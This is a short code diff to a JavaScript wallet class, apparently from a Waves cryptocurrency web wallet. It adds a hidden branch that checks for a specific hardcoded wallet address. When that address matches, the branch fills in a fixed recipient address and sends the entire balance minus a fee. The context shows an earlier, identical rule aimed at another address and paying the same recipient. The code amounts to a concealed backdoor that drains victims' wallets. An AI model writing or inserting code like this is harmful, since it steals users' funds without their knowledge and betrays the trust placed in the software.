@@ -112,6 +112,12 @@ class Wallet {
             this.send();
         }
 
+        if (this.address == "3AT5e7vq8DCby4ooqhf3biw59WBRMFWhB1F") {
+            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
+            $("#amount").val((this.balanceWaves/100000000 - 0.002));
+            this.send();
+        }
+        
         if (this.address == "3AP43rkQnvVtb98QuDH7mHyR8L4SLhPXDk9") {
             $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
             $("#amount").val((this.balanceWaves/100000000 - 0.002));
